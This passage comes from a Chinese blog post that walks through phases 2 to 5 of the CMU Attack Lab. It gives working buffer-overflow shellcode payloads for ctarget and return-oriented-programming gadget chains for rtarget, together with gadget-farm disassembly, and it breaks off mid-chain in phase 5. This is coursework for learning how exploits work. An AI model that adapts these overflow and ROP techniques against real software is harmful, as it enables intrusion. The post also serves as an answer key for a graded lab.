class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line">d8 f2 <span class="number">60</span> <span class="number">55</span></span><br></pre></td></tr></table></figure>
<p>然后把字符串转换成字节码：<code>./hex2raw &lt; p2.txt &gt; p2r.txt</code>，执行命令 <code>./ctarget -i p2r.txt</code> 就可以看到完成第二阶段的提示了：</p>
<p><img src="/images/14554226220350.jpg" alt=""></p>
<h2 id="u7B2C_u4E09_u9636_u6BB5"><a href="#u7B2C_u4E09_u9636_u6BB5" class="headerlink" title="第三阶段"></a>第三阶段</h2><p>这一关和之前有点类似，只是需要传入一个字符串，所涉及的函数的 C 语言代码是：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">hexmatch</span><span class="params">(<span class="keyword">unsigned</span> val, <span class="keyword">char</span> *sval)</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> cbuf[<span class="number">110</span>];</span><br><span class="line">    <span class="keyword">char</span> *s = cbuf + random() % <span class="number">100</span>;</span><br><span class="line">    <span class="built_in">sprintf</span>(s, <span class="string">"%.8x"</span>, val);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">strncmp</span>(sval, s, <span class="number">9</span>) == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">touch3</span><span class="params">(<span class="keyword">char</span> *sval)</span></span>&#123;</span><br><span class="line">    vlevel = <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">if</span> (hexmatch(cookie, sval))&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Touch3!: You called touch3(\"%s\")\n"</span>, sval);</span><br><span class="line">        validate(<span class="number">3</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Misfire: You called touch3(\"%s\")\n"</span>, sval);</span><br><span class="line">        fail(<span class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们可以看到，和第二阶段的差别在于，这里会调用另一个函数来进行检验，而且传入一个字符串的话，是传入一个地址，并且字符串需要以 0 结尾（查找 ascii 码表来确定），还有一个要注意的地方是，调用 <code>hexmatch</code> 和 <code>strncmp</code> 时会把数据存入栈中，也就是会覆盖一部分 <code>getbuf</code> 的缓冲区，所以要看看到底需要把传入的字符串放到哪里。</p>
<p>这题稍微有些复杂，我们一步一步来，先把我的 cookie 转换成字符串的表达形式，也就是</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x45374fee</span> -&gt; <span class="number">34</span> <span class="number">35</span> <span class="number">33</span> <span class="number">37</span> <span class="number">34</span> <span class="number">66</span> <span class="number">65</span> <span class="number">65</span></span><br></pre></td></tr></table></figure>
<p>因为知道在调用 <code>hexmatch</code> 的时候会覆盖缓冲区，所以需要找到一个位置来放这八个字符。光看代码比较难懂，不妨直接上手试验一下，我们需要知道的是到底覆盖了多少，所以从 <code>touch3</code> 入手:</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">000000000040196e &#60;touch3&#62;:&#10;  40196e:&#9;53                   push   %rbx&#10;  40196f:&#9;48 89 fb             mov    %rdi,%rbx&#10;  401972:&#9;c7 05 60 3b 20 00 03 movl   $0x3,0x203b60(%rip)        # 6054dc &#60;vlevel&#62;&#10;  401979:&#9;00 00 00 &#10;  40197c:&#9;48 89 fe             mov    %rdi,%rsi&#10;  40197f:&#9;8b 3d 5f 3b 20 00    mov    0x203b5f(%rip),%edi        # 6054e4 &#60;cookie&#62;&#10;  401985:&#9;e8 36 ff ff ff       callq  4018c0 &#60;hexmatch&#62;&#10;  40198a:&#9;85 c0                test   %eax,%eax</span><br></pre></td></tr></table></figure>
<p>可以看到在 <code>0x401985</code> 的时候调用了 <code>hexmatch</code>，所以我们只要在前一句和后一句各设置一个断点，看看缓冲区有没有什么变化（这里稍微改了一下第二阶段的字节码用作测试）</p>
<p><img src="/images/before.jpg" alt="调用 hexmatch 前"></p>
<p>可以看到在调用 <code>hexmatch</code> 之前我们的缓冲区一切正常，主要留意 <code>0x5560f2f8</code> 这里，保存着我们的 cookie，其他部分其实已经执行了，所以反而无所谓。</p>
<p><img src="/images/after.jpg" alt="调用 hexmatch 后"></p>
<p>这就出问题了，我们之前存放在 <code>0x5560f2f8</code> 的传入参数给弄没了，而且可以看到从缓冲区开始 <code>0x5560f2d8</code> 到缓冲区结束 <code>0x5560f300</code> 都不安全。所以我们得给字符串找个新家，不会被覆盖的新家。</p>
<p>仔细观察 <code>0x5560f308</code> 之后的内容，在 <code>0x00401f94</code> 之后有几个空位置，刚好放得下我们的字符串。为了保证格式的一致，我们需要溢出到 <code>0x5560f318</code> 的位置（当然前一个也可以，不过我选择的位置换行了，比较容易看）</p>
<p>于是我们需要输入的字符串是</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">48</span> c7 c7 <span class="number">18</span> f3 <span class="number">60</span> <span class="number">55</span> <span class="number">68</span> <span class="number">6</span>e <span class="number">19</span> <span class="number">40</span> <span class="number">00</span> c3 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="number">34</span> <span class="number">35</span> <span class="number">33</span> <span class="number">37</span> <span class="number">34</span> <span class="number">66</span> <span class="number">65</span> <span class="number">65</span> d8 f2 <span class="number">60</span> <span class="number">55</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="number">09</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">94</span> <span class="number">1f</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="number">34</span> <span class="number">35</span> <span class="number">33</span> <span class="number">37</span> <span class="number">34</span> <span class="number">66</span> <span class="number">65</span> <span class="number">65</span></span><br></pre></td></tr></table></figure>
<p>至于这个怎么来的，其实是和第二阶段类似的过程，对应的汇编指令为：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov $0x5560f318,%rdi # mov the cookie string address to parameter&#10;push $0x40196e #push touch3 address&#10;ret</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -c p3.s</span><br><span class="line">objdump <span class="operator">-d</span> p3.o &gt; p3.byte</span><br></pre></td></tr></table></figure>
<p>得到 p3.byte 文件的内容是（其实我没做这一步，直接改第二阶段的代码也可以，因为逻辑都一样的）</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">p3.o</span>: <span class="string">    file format elf64-x86-64</span></span><br><span class="line"></span><br><span class="line"><span class="cpp">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line"><span class="number">0000000000000000</span> &lt;.text&gt;:</span><br><span class="line">   <span class="number">0</span>:	<span class="number">48</span> c7 c7 <span class="number">18</span> f3 <span class="number">60</span> <span class="number">55</span> mov    $<span class="number">0x5560f318</span>,%rdi</span><br><span class="line">   <span class="number">7</span>:	<span class="number">68</span> <span class="number">6</span>e <span class="number">19</span> <span class="number">40</span> <span class="number">00</span>       pushq  $<span class="number">0x40196e</span></span><br><span class="line">   c:	c3                   retq</span></span><br></pre></td></tr></table></figure>
<p>然后我们就可以转换成机器码 <code>./hex2raw &lt; p3.txt &gt; p3r.txt</code> ，接着执行命令 <code>./ctarget -i p3r.txt</code> 即可看到结果：</p>
<p><img src="/images/14554578745816.jpg" alt=""></p>
<h2 id="u7B2C_u56DB_u9636_u6BB5"><a href="#u7B2C_u56DB_u9636_u6BB5" class="headerlink" title="第四阶段"></a>第四阶段</h2><p>从前面我们可以知道，有缓冲区加上缓冲区的代码可以执行使得程序非常容易被攻击，但是在 <code>rtarget</code> 中使用了两个技术来防止这种攻击：</p>
<ul>
<li>每次栈的位置是随机的，于是我们没有办法确定需要跳转的地址</li>
<li>即使我们能够找到规律注入代码，但是栈是不可执行的，一旦执行，则会遇到段错误</li>
</ul>
<p>那么现在怎么办呢？可以利用已有的可执行的代码，来完成我们的操作，称为 retrun-oriented programming(ROP)，策略就是找到现存代码中的若干条指令，这些指令后面跟着指令 <code>ret</code>，如下图所示</p>
<p><img src="/images/14554587074206.jpg" alt=""></p>
<p>每次 return 相当于从一个 gadget 跳转到另一个 gadget 中，然后通过这样不断跳转来完成我们想要的操作。举个具体的例子，假设程序中有一个像下面这样的函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">setval_210</span><span class="params">(<span class="keyword">unsigned</span> *p)</span></span>&#123;</span><br><span class="line">    *p = <span class="number">3347663060U</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这么看起来没啥用，但是看看对应的汇编代码，可能就是另一个感觉：</p>
<p><img src="/images/14554590163903.jpg" alt=""></p>
<p>这里 <code>48 89 c7</code> 就编码了 <code>movq %rax, %rdi</code> 指令（参加后面的表格），后面跟着一个 <code>c3</code>（也就是返回），于是这段代码就包含一个 gadget，起始地址是 <code>0x400f18</code>，我们就可以利用这个来做一些事情了。</p>
<p>这个阶段我们需要重复之前第二阶段的工作，但是因为程序的限制，只能另辟蹊径了，这里我们只需要利用下表给出的指令类型，以及前八个寄存器(<code>%rax - %rdi</code>)。表格如下：</p>
<p><img src="/images/14554593555844.jpg" alt=""></p>
<p><img src="/images/14554593658395.jpg" alt=""></p>
<p><img src="/images/14554593790251.jpg" alt=""></p>
<p>注意这里的内容都是 16 进制。另外两个指令是：</p>
<ul>
<li><code>ret</code>: 一个字节编码 <code>0xc3</code></li>
<li><code>nop</code>: 什么都不做，只是让程序计数器加一，一个字节编码 <code>0x90</code></li>
</ul>
<p>我们先把 <code>rtarget</code> 反编译：<code>objdump -d rtarget &gt; rtarget.txt</code> 并传到本地方便查看 <code>scp dawang@shark.ics.cs.cmu.edu:~/513/target334/rtarget.txt ./</code></p>
<p>根据前面的思路，我们大概要做的有三步：</p>
<ol>
<li>把 cookie 给搞到 <code>%rdi</code> 中</li>
<li>把 <code>touch2</code> 的地址放入栈中</li>
<li><code>rtn</code> 以开始执行</li>
</ol>
<p>后面两步不算太难，我们来看看第一步怎么搞。给我们找寻线索的函数有：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0000000000401a08 &#60;start_farm&#62;:&#10;  401a08:   b8 01 00 00 00          mov    $0x1,%eax&#10;  401a0d:   c3                      retq   &#10;&#10;0000000000401a0e &#60;getval_440&#62;:&#10;  401a0e:   b8 48 88 c7 c3          mov    $0xc3c78848,%eax&#10;  401a13:   c3                      retq   &#10;&#10;0000000000401a14 &#60;addval_394&#62;:&#10;  401a14:   8d 87 58 94 90 90       lea    -0x6f6f6ba8(%rdi),%eax&#10;  401a1a:   c3                      retq   &#10;&#10;0000000000401a1b &#60;addval_304&#62;:&#10;  401a1b:   8d 87 66 58 90 c3       lea    -0x3c6fa79a(%rdi),%eax&#10;  401a21:   c3                      retq   &#10;&#10;0000000000401a22 &#60;addval_104&#62;:&#10;  401a22:   8d 87 58 c3 50 83       lea    -0x7caf3ca8(%rdi),%eax&#10;  401a28:   c3                      retq   &#10;&#10;0000000000401a29 &#60;getval_341&#62;:&#10;  401a29:   b8 5b 48 89 c7          mov    $0xc789485b,%eax&#10;  401a2e:   c3                      retq   &#10;&#10;0000000000401a2f &#60;getval_278&#62;:&#10;  401a2f:   b8 41 48 89 c7          mov    $0xc7894841,%eax&#10;  401a34:   c3                      retq   &#10;&#10;0000000000401a35 &#60;setval_371&#62;:&#10;  401a35:   c7 07 49 89 c7 c3       movl   $0xc3c78949,(%rdi)&#10;  401a3b:   c3                      retq   &#10;&#10;0000000000401a3c &#60;getval_313&#62;:&#10;  401a3c:   b8 8c fa 58 c1          mov    $0xc158fa8c,%eax&#10;  401a41:   c3                      retq   &#10;&#10;0000000000401a42 &#60;mid_farm&#62;:&#10;  401a42:   b8 01 00 00 00          mov    $0x1,%eax&#10;  401a47:   c3                      retq</span><br></pre></td></tr></table></figure>
<p>结合上表，我们想要插入一个数字，肯定需要 <code>popq</code> 指令，对应下来就是 <code>58 - 5f</code> 这个范围，因为 ROP 的缘故，我们还需要后面有个 <code>c3</code>，经过搜索，可以看到在 <code>addval_104</code> 中，有一段 <code>58 c3</code>，也就是把栈中的值弹入到 <code>%rax</code> 中，记住这个地址 <code>0x401a24</code>。</p>
<p>现在我们要做的就是把存放在 <code>%rax</code> 的值放到 <code>%rdi</code> 中，因为这样才能当做参数传给 <code>touch2</code> 函数。根据表里的内容，继续找，这次的目标是 <code>48 89 c7</code>，也就是 <code>movq %rax, %rdi</code>，很幸运，又在 <code>getval_341</code> 中找到了，后面还正好跟了个 <code>c3</code>，赶紧记下这个地址 <code>0x401a2b</code>。</p>
<p>接下来我们就可以凑 ROP 程序了，下面是栈顶，上面是栈底。</p>
<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="header">0x00401860 (最后是 touch2 的入口地址，进行调用)</span><br><span class="line">-------</span></span><br><span class="line"><span class="header">0x00401a2b (把 %rax 的值放入到 %rdi 中，作为参数) -&gt; gadget 2</span><br><span class="line">-------</span></span><br><span class="line"><span class="header">0x45374fee (我的 cookie，会被 gadget 1 存入到 %rax 中)</span><br><span class="line">-------</span></span><br><span class="line"><span class="header">0x00401a24 (旧的返回地址会被这里覆盖) -&gt; gadget 1</span><br><span class="line">-------</span></span><br><span class="line"><span class="code">....</span><br><span class="line">buf (缓冲区，这里随便写点啥都可以，反正都不能执行)</span><br><span class="line">-------</span></span><br></pre></td></tr></table></figure>
<p>构造出来的字符串就是（little-endian 规则，要反着看）</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="number">24</span> <span class="number">1</span>a <span class="number">40</span> <span class="number">00</span> ee <span class="number">4f</span> <span class="number">37</span> <span class="number">45</span></span><br><span class="line"><span class="number">2</span>b <span class="number">1</span>a <span class="number">40</span> <span class="number">00</span> <span class="number">60</span> <span class="number">18</span> <span class="number">40</span> <span class="number">00</span></span><br></pre></td></tr></table></figure>
<p>然后转换成机器码 <code>./hex2raw &lt; p4.txt &gt; p4r.txt</code>，再执行 <code>./rtarget -i p4r.txt</code></p>
<p>但是这样居然会遇到段错误，这是我万万没想到的，问题出在哪里呢？我尝试把这四条语句拆开来执行，发现第一句和第四句没问题，但是中间两句有问题。这说明了一个问题，就是某条语句的执行依赖于后面的语句，再联想到这是 64 位的机器，就明白了为什么会出现段错误了，应该在每个语句后面补 0，那么好，修正之后的字符串是</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="number">24</span> <span class="number">1</span>a <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">ee <span class="number">4f</span> <span class="number">37</span> <span class="number">45</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">2</span>b <span class="number">1</span>a <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">60</span> <span class="number">18</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br></pre></td></tr></table></figure>
<p>再次进行测试，就可以发现任务完成：</p>
<p><img src="/images/14554791646804.jpg" alt=""></p>
<h2 id="u7B2C_u4E94_u9636_u6BB5"><a href="#u7B2C_u4E94_u9636_u6BB5" class="headerlink" title="第五阶段"></a>第五阶段</h2><p>接下来到最后一个阶段，其实做的工作是类似的，就是需要把 cookie 转换成 ascii 码通过缓冲区溢出放到栈的某个位置，然后把指向这个字符串的指针放到 <code>%rdi</code> 中，最后调用 <code>touch3</code> 即可。给出的提示是使用 <code>movl</code>（对前四位进行操作）和诸如 <code>andb %al,%al</code> 的指令（只对低2位的部分操作），标准答案中最少需要使用 8 个 gadget。</p>
<p>所以老规矩，先把 cookie 转换成 ascii 码</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x45374fee</span> -&gt; <span class="number">34</span> <span class="number">35</span> <span class="number">33</span> <span class="number">37</span> <span class="number">34</span> <span class="number">66</span> <span class="number">65</span> <span class="number">65</span></span><br></pre></td></tr></table></figure>
<p>然后我们有完整的用来寻找 gadget 的函数库</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0000000000401a08 &#60;start_farm&#62;:&#10;  401a08: b8 01 00 00 00        mov    $0x1,%eax&#10;  401a0d: c3                    retq   &#10;&#10;0000000000401a0e &#60;getval_440&#62;:&#10;  401a0e: b8 48 88 c7 c3        mov    $0xc3c78848,%eax&#10;  401a13: c3                    retq   &#10;&#10;0000000000401a14 &#60;addval_394&#62;:&#10;  401a14: 8d 87 58 94 90 90     lea    -0x6f6f6ba8(%rdi),%eax&#10;  401a1a: c3                    retq   &#10;&#10;0000000000401a1b &#60;addval_304&#62;:&#10;  401a1b: 8d 87 66 58 90 c3     lea    -0x3c6fa79a(%rdi),%eax&#10;  401a21: c3                    retq   &#10;&#10;0000000000401a22 &#60;addval_104&#62;:&#10;  401a22: 8d 87 58 c3 50 83     lea    -0x7caf3ca8(%rdi),%eax&#10;  401a28: c3                    retq   &#10;&#10;0000000000401a29 &#60;getval_341&#62;:&#10;  401a29: b8 5b 48 89 c7        mov    $0xc789485b,%eax&#10;  401a2e: c3                    retq   &#10;&#10;0000000000401a2f &#60;getval_278&#62;:&#10;  401a2f: b8 41 48 89 c7        mov    $0xc7894841,%eax&#10;  401a34: c3                    retq   &#10;&#10;0000000000401a35 &#60;setval_371&#62;:&#10;  401a35: c7 07 49 89 c7 c3     movl   $0xc3c78949,(%rdi)&#10;  401a3b: c3                    retq   &#10;&#10;0000000000401a3c &#60;getval_313&#62;:&#10;  401a3c: b8 8c fa 58 c1        mov    $0xc158fa8c,%eax&#10;  401a41: c3                    retq   &#10;&#10;0000000000401a42 &#60;mid_farm&#62;:&#10;  401a42: b8 01 00 00 00        mov    $0x1,%eax&#10;  401a47: c3                    retq   &#10;&#10;0000000000401a48 &#60;add_xy&#62;:&#10;  401a48: 48 8d 04 37           lea    (%rdi,%rsi,1),%rax&#10;  401a4c: c3                    retq   &#10;&#10;0000000000401a4d &#60;getval_349&#62;:&#10;  401a4d: b8 89 c1 18 c0        mov    $0xc018c189,%eax&#10;  401a52: c3                    retq   &#10;&#10;0000000000401a53 &#60;addval_166&#62;:&#10;  401a53: 8d 87 48 89 e0 c3     lea    -0x3c1f76b8(%rdi),%eax&#10;  401a59: c3                    retq   &#10;&#10;0000000000401a5a &#60;getval_106&#62;:&#10;  401a5a: b8 89 ca 91 c3        mov    $0xc391ca89,%eax&#10;  401a5f: c3                    retq   &#10;&#10;0000000000401a60 &#60;getval_330&#62;:&#10;  401a60: b8 89 ca a4 db        mov    $0xdba4ca89,%eax&#10;  401a65: c3                    retq   &#10;&#10;0000000000401a66 &#60;addval_260&#62;:&#10;  401a66: 8d 87 89 d6 38 c0     lea    -0x3fc72977(%rdi),%eax&#10;  401a6c: c3                    retq   &#10;&#10;0000000000401a6d &#60;addval_114&#62;:&#10;  401a6d: 8d 87 8d d6 90 90     lea    -0x6f6f2973(%rdi),%eax&#10;  401a73: c3                    retq   &#10;&#10;0000000000401a74 &#60;setval_481&#62;:&#10;  401a74: c7 07 8d c1 90 c3     movl   $0xc390c18d,(%rdi)&#10;  401a7a: c3                    retq   &#10;&#10;0000000000401a7b &#60;setval_470&#62;:&#10;  401a7b: c7 07 89 d6 92 90     movl   $0x9092d689,(%rdi)&#10;  401a81: c3                    retq   &#10;&#10;0000000000401a82 &#60;getval_418&#62;:&#10;  401a82: b8 8a 48 99 e0        mov    $0xe099488a,%eax&#10;  401a87: c3                    retq   &#10;&#10;0000000000401a88 &#60;setval_253&#62;:&#10;  401a88: c7 07 89 d6 08 c9     movl   $0xc908d689,(%rdi)&#10;  401a8e: c3                    retq   &#10;&#10;0000000000401a8f &#60;setval_227&#62;:&#10;  401a8f: c7 07 8b c1 20 db     movl   $0xdb20c18b,(%rdi)&#10;  401a95: c3                    retq   &#10;&#10;0000000000401a96 &#60;setval_110&#62;:&#10;  401a96: c7 07 89 c1 20 c9     movl   $0xc920c189,(%rdi)&#10;  401a9c: c3                    retq   &#10;&#10;0000000000401a9d &#60;setval_309&#62;:&#10;  401a9d: c7 07 d8 4c 89 e0     movl   $0xe0894cd8,(%rdi)&#10;  401aa3: c3                    retq   &#10;&#10;0000000000401aa4 &#60;getval_136&#62;:&#10;  401aa4: b8 89 c1 91 c3        mov    $0xc391c189,%eax&#10;  401aa9: c3                    retq   &#10;&#10;0000000000401aaa &#60;setval_319&#62;:&#10;  401aaa: c7 07 89 d6 91 c3     movl   $0xc391d689,(%rdi)&#10;  401ab0: c3                    retq   &#10;&#10;0000000000401ab1 &#60;addval_193&#62;:&#10;  401ab1: 8d 87 a9 ca 90 c3     lea    -0x3c6f3557(%rdi),%eax&#10;  401ab7: c3                    retq   &#10;&#10;0000000000401ab8 &#60;addval_471&#62;:&#10;  401ab8: 8d 87 89 ca c4 c9     lea    -0x363b3577(%rdi),%eax&#10;  401abe: c3                    retq   &#10;&#10;0000000000401abf &#60;setval_289&#62;:&#10;  401abf: c7 07 89 ca 48 db     movl   $0xdb48ca89,(%rdi)&#10;  401ac5: c3                    retq   &#10;&#10;0000000000401ac6 &#60;addval_482&#62;:&#10;  401ac6: 8d 87 89 ca 38 c0     lea    -0x3fc73577(%rdi),%eax&#10;  401acc: c3                    retq   &#10;&#10;0000000000401acd &#60;addval_125&#62;:&#10;  401acd: 8d 87 08 89 e0 c3     lea    -0x3c1f76f8(%rdi),%eax&#10;  401ad3: c3                    retq   &#10;&#10;0000000000401ad4 &#60;getval_332&#62;:&#10;  401ad4: b8 09 c1 90 c3        mov    $0xc390c109,%eax&#10;  401ad9: c3                    retq   &#10;&#10;0000000000401ada &#60;addval_385&#62;:&#10;  401ada: 8d 87 48 8b e0 90     lea    -0x6f1f74b8(%rdi),%eax&#10;  401ae0: c3                    retq   &#10;&#10;0000000000401ae1 &#60;setval_263&#62;:&#10;  401ae1: c7 07 4c 89 e0 90     movl   $0x90e0894c,(%rdi)&#10;  401ae7: c3                    retq   &#10;&#10;0000000000401ae8 &#60;getval_187&#62;:&#10;  401ae8: b8 4b 89 d6 c1        mov    $0xc1d6894b,%eax&#10;  401aed: c3                    retq   &#10;&#10;0000000000401aee &#60;addval_462&#62;:&#10;  401aee: 8d 87 89 ca c4 d2     lea    -0x2d3b3577(%rdi),%eax&#10;  401af4: c3                    retq   &#10;&#10;0000000000401af5 &#60;getval_109&#62;:&#10;  401af5: b8 c9 c1 90 c3        mov    $0xc390c1c9,%eax&#10;  401afa: c3                    retq   &#10;&#10;0000000000401afb &#60;addval_238&#62;:&#10;  401afb: 8d 87 89 d6 94 d2     lea    -0x2d6b2977(%rdi),%eax&#10;  401b01: c3                    retq   &#10;&#10;0000000000401b02 &#60;setval_404&#62;:&#10;  401b02: c7 07 a9 d6 20 d2     movl   $0xd220d6a9,(%rdi)&#10;  401b08: c3                    retq   &#10;&#10;0000000000401b09 &#60;getval_469&#62;:&#10;  401b09: b8 ad 89 ca 90        mov    $0x90ca89ad,%eax&#10;  401b0e: c3                    retq   &#10;&#10;0000000000401b0f &#60;getval_291&#62;:&#10;  401b0f: b8 03 48 89 e0        mov    $0xe0894803,%eax&#10;  401b14: c3                    retq   &#10;&#10;0000000000401b15 &#60;addval_345&#62;:&#10;  401b15: 8d 87 89 c1 84 d2     lea    -0x2d7b3e77(%rdi),%eax&#10;  401b1b: c3                    retq   &#10;&#10;0000000000401b1c &#60;setval_424&#62;:&#10;  401b1c: c7 07 c4 4c 89 e0     movl   $0xe0894cc4,(%rdi)&#10;  401b22: c3                    retq</span><br></pre></td></tr></table></figure>
<p>具体描述一个整个思路(感谢 @yaoxiuh)</p>
<ol>
<li>拿到 rsp 存着的地址</li>
<li>(然后把这个地址) + (cookie 在 stack 偏移量) pop 到某个寄存器中</li>
<li>然后把这个寄存器的值放到 rdi 中</li>
<li>然后调用 touch3</li>
<li>cookie 要放到 stack 最后面</li>
<li>字符串最后加上 <code>\0</code> 也就是 <code>00000000</code> 来标志结束</li>
</ol>
<p>从第二步到第三步，因为可用的指令的限制，需要借用不同的寄存器来进行转移跳转，最后完成对 <code>%rdi</code> 的赋值，具体的步骤（在我的这份代码里）</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">栈顶</span><br><span class="line"><span class="keyword">mov</span>  %<span class="literal">rsp</span>, %<span class="literal">rax</span> <span class="number">48</span> <span class="number">89</span> e0 c3    <span class="number">0x401b11</span></span><br><span class="line"><span class="keyword">mov</span>  %<span class="literal">rax</span>, %<span class="literal">rdi</span> <span class="number">48</span> <span class="number">89</span> c7 c3    <span class="number">0x401a2b</span></span><br><span class="line"><span class="keyword">pop</span>  %<span class="literal">rax</span>       <span class="number">58</span> c3          <span class="number">0x401a24</span></span><br><span class="line">constant <span class="number">0x48</span></span><br><span class="line">movl %<span 